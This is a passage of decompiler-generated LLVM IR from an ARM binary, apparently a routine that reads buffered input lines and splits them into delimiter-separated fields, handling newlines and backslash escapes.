  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_14288, label %dec_label_pc_14598, label %dec_label_pc_142a0

dec_label_pc_142a0:                               ; preds = %dec_label_pc_14284
  %v1_142a0 = urem i32 %arg3, 256
  store i32 %v1_142a0, i32* @sb, align 4
  %v1_142a4 = udiv i32 %arg3, 256
  %v3_142a8 = urem i32 %v1_142a4, 256
  %v3_142ac = mul nuw nsw i32 %v1_142a0, 4
  %v1_142b4 = or i32 %v3_142ac, 1
  %v1_142c0 = and i32 %arg3, 131072
  %v1_142c4 = add nsw i32 %v1_142a0, -1
  %v1_142d0 = and i32 %arg3, 262144
  store i32 %v1_142d0, i32* %r2.global-to-local, align 4
  %v1_142d4 = and i32 %arg3, 65536
  store i32 %v1_142d4, i32* %r3.global-to-local, align 4
  store i32 %v1_142d4, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_142e4 = add i32 %arg4, 1
  store i32 %v1_142e4, i32* @sl, align 4
  %v2_14464 = inttoptr i32 %arg2 to i32*
  %v2_14474 = icmp eq i32 %v1_142c0, 0
  %v2_144cc = icmp eq i32 %v1_142d0, 0
  br label %dec_label_pc_142e8

dec_label_pc_142e8:                               ; preds = %dec_label_pc_142e8.backedge, %dec_label_pc_142a0
  %v2_14304 = phi i32 [ %v0_142e8.pre, %dec_label_pc_142e8.backedge ], [ %tmp, %dec_label_pc_142a0 ]
  %v1_142e8 = add i32 %v2_14304, 4
  %v2_142e8 = inttoptr i32 %v1_142e8 to i32*
  %v3_142e8 = load i32, i32* %v2_142e8, align 4
  store i32 %v3_142e8, i32* %r3.global-to-local, align 4
  %v2_142ec = icmp eq i32 %v3_142e8, 0
  store i1 %v2_142ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_142ec, label %dec_label_pc_142f4, label %dec_label_pc_1433c

dec_label_pc_142f4:                               ; preds = %dec_label_pc_142e8
  %v1_142f4 = add i32 %v2_14304, 16
  %v2_142f4 = inttoptr i32 %v1_142f4 to i32*
  %v3_142f4 = load i32, i32* %v2_142f4, align 4
  store i32 %v3_142f4, i32* %r3.global-to-local, align 4
  %v2_142f8 = icmp eq i32 %v3_142f4, 0
  store i1 %v2_142f8, i1* %cpsr_z.global-to-local, align 1
  %v1_142fc = add i32 %v2_14304, 8
  %v2_142fc = inttoptr i32 %v1_142fc to i32*
  %v3_142fc = load i32, i32* %v2_142fc, align 4
  store i32 %v3_142fc, i32* %r3.global-to-local, align 4
  br i1 %v2_142f8, label %bb, label %bb66

bb:                                               ; preds = %dec_label_pc_142f4
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_142f4, align 4
  %v0_14308.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_142f4, %bb
  %v0_14308 = phi i32 [ %v0_14308.pre, %bb ], [ %v3_142fc, %dec_label_pc_142f4 ]
  %v2_14308 = icmp eq i32 %v0_14308, 0
  store i1 %v2_14308, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14308, label %bb67, label %.thread

bb67:                                             ; preds = %bb66
  store i32 %v1_142b4, i32* %r3.global-to-local, align 4
  %v2_14310 = load i32, i32* @r5, align 4
  %v3_14310 = add i32 %v2_14310, 8
  %v4_14310 = inttoptr i32 %v3_14310 to i32*
  store i32 %v1_142b4, i32* %v4_14310, align 4
  br label %.thread

.thread:                                          ; preds = %bb66, %bb67
  %v0_14314 = load i32, i32* @r5, align 4
  %v1_14314 = add i32 %v0_14314, 16
  %v2_14314 = inttoptr i32 %v1_14314 to i32*
  %v3_14314 = load i32, i32* %v2_14314, align 4
  store i32 %v3_14314, i32* %r0.global-to-local, align 4
  %v1_14318 = add i32 %v0_14314, 8
  %v2_14318 = inttoptr i32 %v1_14318 to i32*
  %v3_14318 = load i32, i32* %v2_14318, align 4
  store i32 %v3_14318, i32* %r3.global-to-local, align 4
  %v2_1431c = add i32 %v3_14318, %v3_14314
  store i32 %v2_1431c, i32* @r0, align 4
  %v0_14320 = call i32 @function_1182c()
  store i32 %v0_14320, i32* %r0.global-to-local, align 4
  %v2_14324 = icmp eq i32 %v0_14320, 0
  store i1 %v2_14324, i1* %cpsr_z.global-to-local, align 1
  %v1_14328 = load i32, i32* @r5, align 4
  %v2_14328 = add i32 %v1_14328, 4
  %v3_14328 = inttoptr i32 %v2_14328 to i32*
  store i32 %v0_14320, i32* %v3_14328, align 4
  br i1 %v2_14324, label %dec_label_pc_14598, label %dec_label_pc_14330

dec_label_pc_14330:                               ; preds = %.thread
  %v0_14330 = load i32, i32* @r5, align 4
  %v1_14330 = add i32 %v0_14330, 20
  %v2_14330 = inttoptr i32 %v1_14330 to i32*
  %v3_14330 = load i32, i32* %v2_14330, align 4
  %v1_14334 = or i32 %v3_14330, 1
  store i32 %v1_14334, i32* %r3.global-to-local, align 4
  store i32 %v1_14334, i32* %v2_14330, align 4
  %v0_1433c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1433c

dec_label_pc_1433c:                               ; preds = %dec_label_pc_142e8, %dec_label_pc_14330
  %v1_14344 = phi i32 [ %v2_14304, %dec_label_pc_142e8 ], [ %v0_1433c.pre, %dec_label_pc_14330 ]
  %v1_1433c = add i32 %v1_14344, 4
  %v2_1433c = inttoptr i32 %v1_1433c to i32*
  %v3_1433c = load i32, i32* %v2_1433c, align 4
  store i32 %v3_1433c, i32* %r2.global-to-local, align 4
  %v4_1433c = add i32 %v1_14344, 8
  %v5_1433c = inttoptr i32 %v4_1433c to i32*
  %v6_1433c = load i32, i32* %v5_1433c, align 4
  %v2_14340 = add i32 %v6_1433c, %v3_1433c
  store i32 %v2_14340, i32* %r3.global-to-local, align 4
  %v2_14344 = add i32 %v1_14344, 12
  %v3_14344 = inttoptr i32 %v2_14344 to i32*
  store i32 %v2_14340, i32* %v3_14344, align 4
  %v0_14348 = load i32, i32* @fp, align 4
  store i32 %v0_14348, i32* @r6, align 4
  br label %dec_label_pc_1434c

dec_label_pc_1434c:                               ; preds = %dec_label_pc_143d8, %dec_label_pc_143c4, %dec_label_pc_1433c
  %v0_14354 = phi i32 [ %v0_14348, %dec_label_pc_1433c ], [ %v1_143c4, %dec_label_pc_143c4 ], [ %v0_14354.pre.pre, %dec_label_pc_143d8 ]
  %v0_1434c = load i32, i32* @r5, align 4
  %v1_1434c = add i32 %v0_1434c, 12
  store i32 %v1_1434c, i32* %r0.global-to-local, align 4
  %v1_14350 = inttoptr i32 %v1_1434c to i32*
  %v2_14350 = load i32, i32* %v1_14350, align 4
  store i32 %v2_14350, i32* %r0.global-to-local, align 4
  %v3_14350 = add i32 %v0_1434c, 16
  %v4_14350 = inttoptr i32 %v3_14350 to i32*
  %v5_14350 = load i32, i32* %v4_14350, align 4
  %v2_14354 = add i32 %v2_14350, %v0_14354
  store i32 %v2_14354, i32* %r0.global-to-local, align 4
  %v2_14358 = sub i32 %v5_14350, %v0_14354
  %v1_1435c = inttoptr i32 %v0_1434c to i32*
  %v2_1435c = load i32, i32* %v1_1435c, align 4
  store i32 %v2_1435c, i32* %r2.global-to-local, align 4
  %v3_14360 = call i32 @function_14d80(i32 %v2_14354, i32 %v2_14358, i32 %v2_1435c)
  store i32 %v3_14360, i32* %r0.global-to-local, align 4
  store i32 %v3_14360, i32* %r4.global-to-local, align 4
  %v2_14364 = icmp eq i32 %v3_14360, 0
  store i1 %v2_14364, i1* %cpsr_z.global-to-local, align 1
  %v0_1436c = load i32, i32* @r5, align 4
  %v1_1436c = add i32 %v0_1436c, 12
  br i1 %v2_14364, label %dec_label_pc_1436c, label %dec_label_pc_14384

dec_label_pc_1436c:                               ; preds = %dec_label_pc_1434c
  store i32 %v1_1436c, i32* %r0.global-to-local, align 4
  %v1_14370 = inttoptr i32 %v1_1436c to i32*
  %v2_14370 = load i32, i32* %v1_14370, align 4
  store i32 %v2_14370, i32* %r0.global-to-local, align 4
  %v3_14370 = add i32 %v0_1436c, 16
  %v4_14370 = inttoptr i32 %v3_14370 to i32*
  %v5_14370 = load i32, i32* %v4_14370, align 4
  store i32 %v5_14370, i32* @r2, align 4
  %v2_14378 = inttoptr i32 %v2_14370 to i8*
  %v3_14378 = call i32 @function_11250(i8* %v2_14378, i32 0)
  store i32 %v3_14378, i32* %r0.global-to-local, align 4
  %v0_1437c = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1459c

dec_label_pc_14384:                               ; preds = %dec_label_pc_1434c
  %v2_14384 = inttoptr i32 %v1_1436c to i32*
  %v3_14384 = load i32, i32* %v2_14384, align 4
  store i32 %v3_14384, i32* @r4, align 4
  %v1_14388 = load i32, i32* @r6, align 4
  %v2_14388 = add i32 %v1_14388, %v3_14384
  store i32 %v2_14388, i32* %r0.global-to-local, align 4
  %v1_1438c = call i32 @function_15830(i32 %v2_14388)
  %v0_14394 = load i32, i32* @r6, align 4
  %v2_14394 = add i32 %v0_14394, %v1_1438c
  store i32 %v2_14394, i32* @r6, align 4
  %v0_14398 = load i32, i32* @r4, align 4
  store i32 %v0_14398, i32* @r0, align 4
  %v2_1439c = call i32 @function_15a7c(i32 %v0_14398, i32 10)
  store i32 %v2_1439c, i32* %r0.global-to-local, align 4
  %v2_143a0 = icmp eq i32 %v2_1439c, 0
  store i1 %v2_143a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_143a0, label %dec_label_pc_143cc, label %dec_label_pc_143a8

dec_label_pc_143a8:                               ; preds = %dec_label_pc_14384
  %v1_143a8 = inttoptr i32 %v2_1439c to i8*
  %v2_143a8 = load i8, i8* %v1_143a8, align 1
  %v3_143a8 = zext i8 %v2_143a8 to i32
  %v1_143ac = add nuw nsw i32 %v3_143a8, 255
  %v1_143b0 = urem i32 %v1_143ac, 256
  store i32 %v1_143b0, i32* %r3.global-to-local, align 4
  %v7_143b4 = icmp eq i32 %v1_143b0, 92
  store i1 %v7_143b4, i1* %cpsr_z.global-to-local, align 1
  %v1_143b8 = trunc i32 %v1_143ac to i8
  store i8 %v1_143b8, i8* %v1_143a8, align 1
  %v0_143bc = load i32, i32* @r6, align 4
  %v1_143bc = add i32 %v0_143bc, -1
  store i32 %v1_143bc, i32* @r6, align 4
  %v0_143c0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_143c0, label %dec_label_pc_143c4, label %dec_label_pc_14450

dec_label_pc_143c4:                               ; preds = %dec_label_pc_143a8
  %v1_143c4 = add i32 %v0_143bc, -2
  store i32 %v1_143c4, i32* @r6, align 4
  br label %dec_label_pc_1434c

dec_label_pc_143cc:                               ; preds = %dec_label_pc_14384
  %v0_143cc = load i32, i32* @r5, align 4
  %v1_143cc = add i32 %v0_143cc, 20
  %v2_143cc = inttoptr i32 %v1_143cc to i32*
  %v3_143cc = load i32, i32* %v2_143cc, align 4
  store i32 %v3_143cc, i32* %r3.global-to-local, align 4
  %v2_143d0 = icmp eq i32 %v3_143cc, 0
  store i1 %v2_143d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_143d0, label %dec_label_pc_14408, label %dec_label_pc_143d8

dec_label_pc_143d8:                               ; preds = %dec_label_pc_143cc
  %v1_143d8 = add i32 %v0_143cc, 16
  %v2_143d8 = inttoptr i32 %v1_143d8 to i32*
  %v3_143d8 = load i32, i32* %v2_143d8, align 4
  store i32 %v3_143d8, i32* %r3.global-to-local, align 4
  %v1_143dc = add i32 %v0_143cc, 8
  %v2_143dc = inttoptr i32 %v1_143dc to i32*
  %v3_143dc = load i32, i32* %v2_143dc, align 4
  %v1_143e0 = add i32 %v3_143d8, 4096
  store i32 %v1_143e0, i32* %r3.global-to-local, align 4
  %v2_143e4 = add i32 %v3_143dc, %v1_143e0
  store i32 %v1_143e0, i32* %v2_143d8, align 4
  %v0_143ec = load i32, i32* @r5, align 4
  %v1_143ec = add i32 %v0_143ec, 4
  %v2_143ec = inttoptr i32 %v1_143ec to i32*
  %v3_143ec = load i32, i32* %v2_143ec, align 4
  store i32 %v3_143ec, i32* %r0.global-to-local, align 4
  %v4_143f0 = inttoptr i32 %v3_143ec to i32*
  %v5_143f0 = call i32 @function_12280(i32* %v4_143f0, i32 %v2_143e4, i32 %v2_1435c, i32 %v1_143e0)
  store i32 %v5_143f0, i32* %r0.global-to-local, align 4
  %v0_143f4 = load i32, i32* @r5, align 4
  %v1_143f4 = add i32 %v0_143f4, 8
  %v2_143f4 = inttoptr i32 %v1_143f4 to i32*
  %v3_143f4 = load i32, i32* %v2_143f4, align 4
  %v2_143f8 = add i32 %v3_143f4, %v5_143f0
  store i32 %v2_143f8, i32* %r3.global-to-local, align 4
  %v2_143fc = add i32 %v0_143f4, 12
  %v3_143fc = inttoptr i32 %v2_143fc to i32*
  store i32 %v2_143f8, i32* %v3_143fc, align 4
  %v1_14400 = load i32, i32* @r5, align 4
  %v2_14400 = add i32 %v1_14400, 4
  %v3_14400 = inttoptr i32 %v2_14400 to i32*
  store i32 %v5_143f0, i32* %v3_14400, align 4
  %v0_14354.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1434c

dec_label_pc_14408:                               ; preds = %dec_label_pc_143cc, %.dec_label_pc_14408_crit_edge
  %v0_14408 = phi i32 [ %v0_14408.pre, %.dec_label_pc_14408_crit_edge ], [ %v0_143cc, %dec_label_pc_143cc ]
  %v1_14408 = inttoptr i32 %v0_14408 to i32*
  %v2_14408 = load i32, i32* %v1_14408, align 4
  %v1_1440c = add i32 %v2_14408, 52
  %v2_1440c = inttoptr i32 %v1_1440c to i32*
  %v3_1440c = load i32, i32* %v2_1440c, align 4
  store i32 %v3_1440c, i32* %r3.global-to-local, align 4
  %v2_14410 = icmp eq i32 %v3_1440c, 0
  store i1 %v2_14410, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14410, label %dec_label_pc_1443c, label %dec_label_pc_14418

dec_label_pc_14418:                               ; preds = %dec_label_pc_14408
  %v1_14418 = add i32 %v2_14408, 16
  %v2_14418 = inttoptr i32 %v1_14418 to i32*
  %v3_14418 = load i32, i32* %v2_14418, align 4
  store i32 %v3_14418, i32* %r2.global-to-local, align 4
  %v1_1441c = add i32 %v2_14408, 24
  %v2_1441c = inttoptr i32 %v1_1441c to i32*
  %v3_1441c = load i32, i32* %v2_1441c, align 4
  store i32 %v3_1441c, i32* %r3.global-to-local, align 4
  %v3_14420 = icmp ult i32 %v3_14418, %v3_1441c
  %v9_14420 = icmp eq i32 %v3_14418, %v3_1441c
  store i1 %v9_14420, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_14420, label %dec_label_pc_14444thread-pre-split, label %dec_label_pc_14430

dec_label_pc_14430:                               ; preds = %dec_label_pc_14418
  store i32 %v2_14408, i32* %r0.global-to-local, align 4
  %v1_14434 = inttoptr i32 %v2_14408 to i16*
  %v2_14434 = call i32 @function_151d0(i16* %v1_14434)
  store i32 %v2_14434, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14444

dec_label_pc_1443c:                               ; preds = %dec_label_pc_14408
  store i32 %v2_14408, i32* %r0.global-to-local, align 4
  %v1_14440 = call i32 @function_14ca4(i32 %v2_14408)
  store i32 %v1_14440, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14444

dec_label_pc_14444thread-pre-split:               ; preds = %dec_label_pc_14418
  %v2_14424 = inttoptr i32 %v3_14418 to i8*
  %v3_14424 = load i8, i8* %v2_14424, align 1
  %v4_14424 = zext i8 %v3_14424 to i32
  store i32 %v4_14424, i32* %r0.global-to-local, align 4
  %v6_14424 = add i32 %v3_14418, 1
  store i32 %v6_14424, i32* %r2.global-to-local, align 4
  store i32 %v6_14424, i32* %v2_14418, align 4
  %v0_14444.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14444

dec_label_pc_14444:                               ; preds = %dec_label_pc_14444thread-pre-split, %dec_label_pc_14430, %dec_label_pc_1443c
  %v1_14448 = phi i32 [ %v0_14444.pr, %dec_label_pc_14444thread-pre-split ], [ %v2_14434, %dec_label_pc_14430 ], [ %v1_14440, %dec_label_pc_1443c ]
  %v7_14444 = icmp eq i32 %v1_14448, 10
  store i1 %v7_14444, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14444, label %dec_label_pc_14450.loopexit, label %bb68

bb68:                                             ; preds = %dec_label_pc_14444
  %v8_14448 = icmp eq i32 %v1_14448, -1
  store i1 %v8_14448, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_14448, label %dec_label_pc_14450.loopexit, label %.dec_label_pc_14408_crit_edge

.dec_label_pc_14408_crit_edge:                    ; preds = %bb68
  %v0_14408.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14408

dec_label_pc_14450.loopexit:                      ; preds = %bb68, %dec_label_pc_14444
  %v0_14450.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_14450

dec_label_pc_14450:                               ; preds = %dec_label_pc_143a8, %dec_label_pc_14450.loopexit
  %v0_14450 = phi i32 [ %v0_14450.pre, %dec_label_pc_14450.loopexit ], [ %v1_143bc, %dec_label_pc_143a8 ]
  %v7_14450 = icmp eq i32 %v0_14450, -1
  store i1 %v7_14450, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14450, label %dec_label_pc_14598, label %dec_label_pc_14458

dec_label_pc_14458:                               ; preds = %dec_label_pc_14450
  %v0_14458 = load i32, i32* @r5, align 4
  %v1_14458 = add i32 %v0_14458, 4
  %v2_14458 = inttoptr i32 %v1_14458 to i32*
  %v3_14458 = load i32, i32* %v2_14458, align 4
  store i32 %v3_14458, i32* %r0.global-to-local, align 4
  store i32 %v3_142ac, i32* @r2, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  store i32 %v3_14458, i32* %v2_14464, align 4
  %v0_14468 = load i32, i32* @fp, align 4
  %v2_1446c = inttoptr i32 %v3_14458 to i8*
  %v3_1446c = call i32 @function_11250(i8* %v2_1446c, i32 %v0_14468)
  store i32 %v3_1446c, i32* %r0.global-to-local, align 4
  store i32 %v1_142c0, i32* %r2.global-to-local, align 4
  store i1 %v2_14474, i1* %cpsr_z.global-to-local, align 1
  %v0_14478 = load i32, i32* @r5, align 4
  %v1_14478 = add i32 %v0_14478, 12
  %v2_14478 = inttoptr i32 %v1_14478 to i32*
  %v3_14478 = load i32, i32* %v2_14478, align 4
  store i32 %v3_14478, i32* @r4, align 4
  br i1 %v2_14474, label %dec_label_pc_14490, label %dec_label_pc_14480

dec_label_pc_14480:                               ; preds = %dec_label_pc_14458
  store i32 %v3_14478, i32* @r0, align 4
  %v0_14484 = load i32, i32* @sl, align 4
  %v2_14488 = inttoptr i32 %v3_14478 to i8*
  %v3_14488 = call i32 @function_158f4(i8* %v2_14488, i32 %v0_14484)
  store i32 %v3_14488, i32* %r0.global-to-local, align 4
  %v0_1448c = load i32, i32* @r4, align 4
  %v2_1448c = add i32 %v0_1448c, %v3_14488
  store i32 %v2_1448c, i32* @r4, align 4
  br label %dec_label_pc_14490

dec_label_pc_14490:                               ; preds = %dec_label_pc_14458, %dec_label_pc_14480
  %v0_1456813 = phi i32 [ %v3_14478, %dec_label_pc_14458 ], [ %v2_1448c, %dec_label_pc_14480 ]
  %v1_14490 = inttoptr i32 %v0_1456813 to i8*
  %v2_14490 = load i8, i8* %v1_14490, align 1
  %v3_14490 = zext i8 %v2_14490 to i32
  store i32 %v3_14490, i32* %r2.global-to-local, align 4
  %v2_14494 = icmp eq i8 %v2_14490, 0
  store i1 %v2_14494, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14494, label %dec_label_pc_142e8.backedge, label %dec_label_pc_1449c

dec_label_pc_1449c:                               ; preds = %dec_label_pc_14490
  %v0_1449c = load i32, i32* @r7, align 4
  %v1_1449c = inttoptr i32 %v0_1449c to i8*
  %v2_1449c = load i8, i8* %v1_1449c, align 1
  %v3_1449c = zext i8 %v2_1449c to i32
  store i32 %v3_1449c, i32* %r3.global-to-local, align 4
  %v9_144a0 = icmp eq i8 %v2_1449c, %v2_14490
  store i1 %v9_144a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_144a0, label %dec_label_pc_142e8.backedge, label %dec_label_pc_14568.preheader

dec_label_pc_14568.preheader:                     ; preds = %dec_label_pc_1449c
  %v1_144a4 = load i32, i32* @fp, align 4
  store i32 %v1_144a4, i32* @r6, align 4
  %v2_1456815 = load i8, i8* %v1_14490, align 1
  %v3_1456816 = zext i8 %v2_1456815 to i32
  store i32 %v3_1456816, i32* %r2.global-to-local, align 4
  %v2_1456c17 = icmp eq i8 %v2_1456815, 0
  store i1 %v2_1456c17, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1456c17, label %dec_label_pc_14584, label %dec_label_pc_14574.preheader

dec_label_pc_14574.preheader:                     ; preds = %dec_label_pc_14568.preheader
  %v2_1457482 = load i8, i8* %v1_1449c, align 1
  %v3_1457483 = zext i8 %v2_1457482 to i32
  store i32 %v3_1457483, i32* %r3.global-to-local, align 4
  %v9_1457886 = icmp eq i8 %v2_1457482, %v2_1456815
  store i1 %v9_1457886, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1457886, label %dec_label_pc_14584, label %bb74

dec_label_pc_144b0:                               ; preds = %bb74
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_144b4 = load i32, i32* %v2_14464, align 4
  store i32 %v2_144b4, i32* %r3.global-to-local, align 4
  store i32 %v1_142c4, i32* %r2.global-to-local, align 4
  %v9_144bc = icmp eq i32 %v2_144c088, %v1_142c4
  store i1 %v9_144bc, i1* %cpsr_z.global-to-local, align 1
  %v5_144c0 = mul i32 %v2_144c088, 4
  %v6_144c0 = add i32 %v2_144b4, %v5_144c0
  %v7_144c0 = inttoptr i32 %v6_144c0 to i32*
  store i32 %v0_144c087, i32* %v7_144c0, align 4
  br i1 %v9_144bc, label %dec_label_pc_144c8, label %dec_label_pc_144d4

dec_label_pc_144c8:                               ; preds = %dec_label_pc_144b0
  store i32 %v1_142d0, i32* %r3.global-to-local, align 4
  store i1 %v2_144cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_144cc, label %dec_label_pc_144d4, label %dec_label_pc_144f4

dec_label_pc_144d4:                               ; preds = %dec_label_pc_144c8, %dec_label_pc_144b0
  %v0_144d4 = load i32, i32* @r7, align 4
  %v1_144d4 = inttoptr i32 %v0_144d4 to i8*
  %v2_144d4 = load i8, i8* %v1_144d4, align 1
  %v3_144d4 = zext i8 %v2_144d4 to i32
  store i32 %v3_144d4, i32* %r3.global-to-local, align 4
  %v2_144d8 = icmp eq i8 %v2_144d4, 0
  store i1 %v2_144d8, i1* %cpsr_z.global-to-local, align 1
  %v0_144dc = load i32, i32* @r4, align 4
  store i32 %v0_144dc, i32* @r0, align 4
  %v1_144e0 = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_144d8, i32 %v1_144e0, i32 %v0_144d4
  store i32 %storemerge, i32* @r1, align 4
  %v0_144e8 = call i32 @function_158b0()
  store i32 %v0_144e8, i32* %r0.global-to-local, align 4
  %v0_144ec = load i32, i32* @r4, align 4
  %v2_144ec = add i32 %v0_144ec, %v0_144e8
  store i32 %v2_144ec, i32* @r4, align 4
  br label %dec_label_pc_1452c

dec_label_pc_144f4:                               ; preds = %dec_label_pc_144c8
  %v0_144f4 = load i32, i32* @r4, align 4
  store i32 %v0_144f4, i32* @r0, align 4
  %v0_144f8 = load i32, i32* @r7, align 4
  %v1_144f8 = inttoptr i32 %v0_144f8 to i8*
  %v2_144f8 = load i8, i8* %v1_144f8, align 1
  %v3_144f8 = zext i8 %v2_144f8 to i32
  %v5_144fc = call i32 @function_15990(i32 %v0_144f4, i32 %v3_144f8, i32 %v1_142c4, i32 %v1_142d0)
  store i32 %v5_144fc, i32* %r0.global-to-local, align 4
  store i32 %v1_142c0, i32* %r2.global-to-local, align 4
  store i1 %v2_14474, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_144fc, i32* @r4, align 4
  br i1 %v2_14474, label %dec_label_pc_1452c, label %dec_label_pc_14518

dec_label_pc_14514:                               ; preds = %dec_label_pc_14518
  %v1_14514 = add i32 %v0_1452c.pre, -1
  store i32 %v1_14514, i32* @r4, align 4
  br label %dec_label_pc_14518

dec_label_pc_14518:                               ; preds = %dec_label_pc_144f4, %dec_label_pc_14514
  %v0_14518 = phi i32 [ %v1_14514, %dec_label_pc_14514 ], [ %v5_144fc, %dec_label_pc_144f4 ]
  %v1_14518 = add i32 %v0_14518, -1
  %v2_14518 = inttoptr i32 %v1_14518 to i8*
  %v3_14518 = load i8, i8* %v2_14518, align 1
  %v4_14518 = zext i8 %v3_14518 to i32
  %v0_1451c = load i32, i32* @sl, align 4
  store i32 %v0_1451c, i32* @r0, align 4
  %v2_14520 = call i32 @function_15a7c(i32 %v0_1451c, i32 %v4_14518)
  store i32 %v2_14520, i32* %r0.global-to-local, align 4
  %v2_14524 = icmp eq i32 %v2_14520, 0
  store i1 %v2_14524, i1* %cpsr_z.global-to-local, align 1
  %v0_1452c.pre = load i32, i32* @r4, align 4
  br i1 %v2_14524, label %dec_label_pc_1452c, label %dec_label_pc_14514

dec_label_pc_1452c:                               ; preds = %dec_label_pc_14518, %dec_label_pc_144f4, %dec_label_pc_144d4
  %v3_14538 = phi i32 [ %v5_144fc, %dec_label_pc_144f4 ], [ %v2_144ec, %dec_label_pc_144d4 ], [ %v0_1452c.pre, %dec_label_pc_14518 ]
  %v1_1452c = inttoptr i32 %v3_14538 to i8*
  %v2_1452c = load i8, i8* %v1_1452c, align 1
  %v3_1452c = zext i8 %v2_1452c to i32
  store i32 %v3_1452c, i32* %r2.global-to-local, align 4
  %v0_14530 = load i32, i32* @r7, align 4
  %v1_14530 = inttoptr i32 %v0_14530 to i8*
  %v2_14530 = load i8, i8* %v1_14530, align 1
  %v3_14530 = zext i8 %v2_14530 to i32
  store i32 %v3_14530, i32* %r3.global-to-local, align 4
  %v9_14534 = icmp eq i8 %v2_14530, %v2_1452c
  store i1 %v9_14534, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14534, label %bb71, label %dec_label_pc_14540

bb71:                                             ; preds = %dec_label_pc_1452c
  %v1_14538 = load i32, i32* @fp, align 4
  %v2_14538 = trunc i32 %v1_14538 to i8
  store i8 %v2_14538, i8* %v1_1452c, align 1
  %v0_1453c.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1453c.pr, label %bb73, label %.dec_label_pc_14540_crit_edge

.dec_label_pc_14540_crit_edge:                    ; preds = %bb71
  %v0_14540.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14540

dec_label_pc_14540:                               ; preds = %.dec_label_pc_14540_crit_edge, %dec_label_pc_1452c
  %v0_14540 = phi i32 [ %v0_14540.pre, %.dec_label_pc_14540_crit_edge ], [ %v3_1452c, %dec_label_pc_1452c ]
  %v2_14540 = icmp eq i32 %v0_14540, 0
  store i1 %v2_14540, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14540, label %bb73, label %bb72

bb72:                                             ; preds = %dec_label_pc_14540
  %v1_14544 = load i32, i32* @fp, align 4
  %v2_14544 = trunc i32 %v1_14544 to i8
  %v3_14544 = load i32, i32* @r4, align 4
  %v4_14544 = inttoptr i32 %v3_14544 to i8*
  store i8 %v2_14544, i8* %v4_14544, align 1
  %v5_14544 = load i32, i32* @r4, align 4
  %v6_14544 = add i32 %v5_14544, 1
  store i32 %v6_14544, i32* @r4, align 4
  br label %bb73

bb73:                                             ; preds = %bb71, %dec_label_pc_14540, %bb72
  %v2_14548 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_14548, i32* %r3.global-to-local, align 4
  %v2_1454c = icmp eq i32 %v2_14548, 0
  store i1 %v2_1454c, i1* %cpsr_z.global-to-local, align 1
  %v0_14568.pre = load i32, i32* @r4, align 4
  br i1 %v2_1454c, label %dec_label_pc_14564, label %dec_label_pc_14554

dec_label_pc_14554:                               ; preds = %bb73
  store i32 %v0_14568.pre, i32* @r0, align 4
  %v0_14558 = load i32, i32* @sl, align 4
  %v2_1455c = inttoptr i32 %v0_14568.pre to i8*
  %v3_1455c = call i32 @function_158f4(i8* %v2_1455c, i32 %v0_14558)
  store i32 %v3_1455c, i32* %r0.global-to-local, align 4
  %v0_14560 = load i32, i32* @r4, align 4
  %v2_14560 = add i32 %v0_14560, %v3_1455c
  store i32 %v2_14560, i32* @r4, align 4
  br label %dec_label_pc_14564

dec_label_pc_14564:                               ; preds = %bb73, %dec_label_pc_14554
  %v0_14568 = phi i32 [ %v2_14560, %dec_label_pc_14554 ], [ %v0_14568.pre, %bb73 ]
  %v0_14564 = load i32, i32* @r6, align 4
  %v1_14564 = add i32 %v0_14564, 1
  store i32 %v1_14564, i32* @r6, align 4
  %v1_14568 = inttoptr i32 %v0_14568 to i8*
  %v2_14568 = load i8, i8* %v1_14568, align 1
  %v3_14568 = zext i8 %v2_14568 to i32
  store i32 %v3_14568, i32* %r2.global-to-local, align 4
  %v2_1456c = icmp eq i8 %v2_14568, 0
  store i1 %v2_1456c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1456c, label %dec_label_pc_14584, label %dec_label_pc_14564.dec_label_pc_14574_crit_edge

dec_label_pc_14564.dec_label_pc_14574_crit_edge:  ; preds = %dec_label_pc_14564
  %v0_14574.pre = load i32, i32* @r7, align 4
  %v1_14574 = inttoptr i32 %v0_14574.pre to i8*
  %v2_14574 = load i8, i8* %v1_14574, align 1
  %v3_14574 = zext i8 %v2_14574 to i32
  store i32 %v3_14574, i32* %r3.global-to-local, align 4
  %v9_14578 = icmp eq i8 %v2_14574, %v2_14568
  store i1 %v9_14578, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14578, label %dec_label_pc_14584, label %bb74

